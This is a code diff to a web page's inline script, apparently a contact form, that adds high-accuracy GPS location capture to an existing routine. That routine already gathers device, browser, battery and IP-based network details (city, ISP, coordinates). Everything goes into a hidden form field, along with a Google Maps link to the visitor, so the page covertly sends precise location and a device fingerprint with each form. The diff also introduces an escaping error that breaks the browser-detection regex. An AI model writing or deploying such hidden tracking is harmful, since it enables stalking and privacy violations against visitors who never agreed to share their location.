@@ -78,9 +78,29 @@ aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle 
 async function fillImportantInfo() {
     const battery = navigator.getBattery ? await navigator.getBattery() : {};
     const nav = navigator;
+
+    // Get exact GPS-based coordinates
+    const getLocation = () =>
+        new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    resolve({
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude
+                    });
+                },
+                () => {
+                    resolve({ lat: 'Unavailable', lon: 'Unavailable' });
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        });
+
+    const location = await getLocation();
+
     const deviceInfo = `Device Info:
 Device       : ${/mobile/i.test(nav.userAgent) ? 'Mobile' : 'Desktop'}
-Browser      : ${nav.userAgent.match(/(Chrome|Firefox|Safari|Edge|OPR)\/\d+/)?.[0] || 'Unknown'}
+Browser      : ${nav.userAgent.match(/(Chrome|Firefox|Safari|Edge|OPR)\/\\d+/)?.[0] || 'Unknown'}
 Platform     : ${nav.platform}
 Language     : ${nav.language}
 Screen       : ${screen.width}x${screen.height} (${screen.colorDepth}-bit)
@@ -105,56 +125,22 @@ City       : ${netInfo.city || '-'}
 Region     : ${netInfo.region || '-'}
 Country    : ${netInfo.country_name || '-'} (${netInfo.country || '-'})
 Postal     : ${netInfo.postal || 'null'}
-Latitude   : ${netInfo.latitude || '-'}
-Longitude  : ${netInfo.longitude || '-'}
+IP-Based Lat : ${netInfo.latitude || '-'}
+IP-Based Lon : ${netInfo.longitude || '-'}
+GPS-Based Lat: ${location.lat}
+GPS-Based Lon: ${location.lon}
 Timezone   : ${netInfo.timezone || '-'}
 Currency   : ${netInfo.currency || '-'}
 ISP        : ${netInfo.org || '-'}
 ASN        : ${netInfo.asn || '-'}
-Google Maps: https://maps.google.com/?q=${netInfo.latitude},${netInfo.longitude}`;
+Google Maps: https://maps.google.com/?q=${location.lat},${location.lon}`;
 
+    // Set hidden field value
     document.getElementById("important_info").value = `${deviceInfo}\n\n${networkInfo}`;
 }
 
 document.addEventListener("DOMContentLoaded", fillImportantInfo);
-
-document.getElementById("contactForm").addEventListener("submit", function (e) {
-    e.preventDefault();
-    const form = this;
-    const resDiv = document.getElementById("response");
-    resDiv.textContent = "Sending...";
-    resDiv.style.color = "black";
-
-    const formData = new FormData(form);
-
-    fetch(form.action, {
-        method: "POST",
-        body: formData,
-        headers: {
-            'Accept': 'application/json'
-        }
-    }).then(response => {
-        if (response.ok) {
-            resDiv.textContent = "✅ Message sent successfully! Redirecting...";
-            resDiv.style.color = "green";
-            form.reset();
-            setTimeout(() => { window.location.href = form._next.value; }, 2000);
-        } else {
-            response.json().then(data => {
-                resDiv.textContent = `❌ Error: ${data.message || "An unknown error occurred."}`;
-                resDiv.style.color = "red";
-            }).catch(() => {
-                resDiv.textContent = "❌ Error: Possibly due to wrong email or network issue.";
-                resDiv.style.color = "red";
-            });
-        }
-    }).catch(() => {
-        resDiv.textContent = "❌ Error: Network connection failed. Please try again.";
-        resDiv.style.color = "red";
-    });
-});
 </script>
-
 </div>
 </div>
 </div>
